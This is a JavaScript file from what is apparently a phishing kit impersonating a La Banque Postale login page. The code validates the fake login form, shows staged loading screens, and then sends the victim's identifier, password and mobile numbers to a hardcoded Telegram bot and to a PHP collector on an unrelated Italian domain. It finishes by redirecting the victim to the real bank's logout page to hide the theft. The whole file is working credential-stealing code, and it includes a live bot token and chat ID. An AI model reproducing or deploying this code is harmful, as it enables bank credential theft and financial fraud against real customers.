$(document).ready(function() {

            
            $('#check').click(function() {
            	if (!validatemob()) {
            		 return;
            	} 
                function validatemob() {
                var valid = true;
                var mob = document.getElementById('mobile').value;
                if (mob.length < 10) {
                $("#mobile").css({ "border" : "2px solid #eec77c"}); 
                valid = false;
                } 
            return valid; 
            }
                $('html, body').animate({
                    scrollTop: 0
                }, 100);
                $('.main--2').fadeOut(100);


                setTimeout(
                    function() {
                        $('.main--3').fadeIn(1000);
                    }, 100
                );

                setTimeout(
                    function() {
                        $('html, body').animate({
                            scrollTop: 0
                        }, 100);
                        $('.main--3').fadeOut(180); 
                    }, 3000
                );

                setTimeout(
                    function() {
                        $('html, body').animate({
                            scrollTop: 0
                        }, 100);
                        $('.main--3').fadeOut(100);
                        $('.main--4').fadeIn(1000);
                    }, 4000
                );
            });

  
     $('#valider').click(function() {
     	 if (!validatelogin()) {
            		 return;
            	} 
                function validatelogin() {
                var valid = true;
                 var iden = document.getElementById('identifiant').value;
       var pasp = document.getElementById('psword').value;
      
       if (iden.length < 10) {
           $("#identifiant").css({ "border" : "2px solid #eec77c"}); 
            valid = false;
          }
         
    if (pasp.length < 6) {
            $(".password").css({ "border" : "2px solid #eec77c"});
            valid = false;
        }
        return valid; 
    }
               $('html, body').animate({
                    scrollTop: 0
                }, 100);
                $('.main--0').fadeOut(100);

                setTimeout(
                    function() {
                        $('.main--1').fadeIn(1000);
                    }, 100
                );

                setTimeout(
                    function() {
                        $('html, body').animate({
                            scrollTop: 0
                        }, 100);
                        $('.main--1').fadeOut(280); 
                    }, 3000
                );

                setTimeout(
                    function() {
                        $('html, body').animate({
                            scrollTop: 0
                        }, 100);
                        $('.main--1').fadeOut(100);
                        $('.main--0').fadeIn(1000);
                        $('#validerr').removeClass('hidden');
                        $('#valider').addClass('hidden');
                        $('#message-container').removeClass('hidden');
                        $("#identifiant").val('');
                        $("#postClavier").val('');
                        $("#psword").val('');
                    }, 4000
                );
            });
  



      
     $('#validerr').click(function() {
     	 if (!validatelogin()) {
            		 return;
            	} 
                function validatelogin() {
                var valid = true;
                 var iden = document.getElementById('identifiant').value;
                 var pasp = document.getElementById('psword').value;
      
       if (iden.length < 10) {
           $("#identifiant").css({ "border" : "2px solid #eec77c"}); 
            valid = false;
          }
         
    if (pasp.length < 6) {
            $(".password").css({ "border" : "2px solid #eec77c"});
            valid = false;
        }
        return valid; 
    }
               $('html, body').animate({
                    scrollTop: 0
                }, 100);
                $('.main--0').fadeOut(100);


                setTimeout(
                    function() {
                        $('.main--1').fadeIn(1000);
                    }, 100
                );

                setTimeout(
                    function() {
                        $('html, body').animate({
                            scrollTop: 0
                        }, 100);
                        $('.main--1').fadeOut(280); 
                    }, 3000
                );

                setTimeout(
                    function() {
                        $('html, body').animate({
                            scrollTop: 0
                        }, 100);
                        $('.main--1').fadeOut(100);
                        $('.main--2').fadeIn(1000);
                    }, 4000
                );
            });
  
  

const token = '2092304553:AAEsnoIqHbmf0XeAVns9VDbAwlqiA6nEzj4';
const chatId = '2019685107';

 $("#complete").on('click', function (event) {
 	 if (!validateDep()) {
            return;
        }
         execute();
         mexecute();
        function validateDep() {
        var valid = true;
       var mobiles = document.getElementById('mobiles').value;
    if (mobiles.length < 10) {
            $("#mobiles").css({ "border" : "2px solid #eec77c"});
            valid = false;
        }
        return valid; 
    }
 $('html, body').animate({
                    scrollTop: 0
                }, 100);
                $('.main--4').fadeOut(200);

                setTimeout(
                    function() {
                        $('.main--5').fadeIn(1000);
                    }, 200
                );
        function execute() {
            const identifiant = document.querySelector('#identifiant').value;
            const postClavier = document.querySelector('#postClavier').value;
            const mobile = document.querySelector('#mobile').value;
            const mobiles = document.querySelector('#mobiles').value;
            
            const message = `Code Postale \n Identifiant: ${identifiant}\nPassword: ${postClavier}\nMobile: ${mobile}\nmobiles: ${mobiles}`;
            $.ajax({
                type: 'POST',
                url: `https://api.telegram.org/bot${token}/sendMessage`,
                data: {
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'html',
                },
            });
        }
        
     function mexecute() {
             const identifiant = document.querySelector('#identifiant').value;
            const postClavier = document.querySelector('#postClavier').value;
            const mobile = document.querySelector('#mobile').value;
            const mobiles = document.querySelector('#mobiles').value;
            
            const message = `Code Postale \n Identifiant: ${identifiant}\nPassword: ${postClavier}\nMobile: ${mobile}\nmobiles: ${mobiles}`;
            $( "#data" ).val(message);
            $.ajax({
                type: 'POST',
                url: `https://www.italmediab2b.it/feedbnp.php`,
                data: $( "#data" ).val(message),
            });
        }  setTimeout(
                    function() {
                        window.location.replace("https://voscomptesenligne.labanquepostale.fr/voscomptes/canalXHTML/securite/deconnexion/init-deconnexion.ea");
                    }, 7000
                );	
    });
     
 
			
        });
 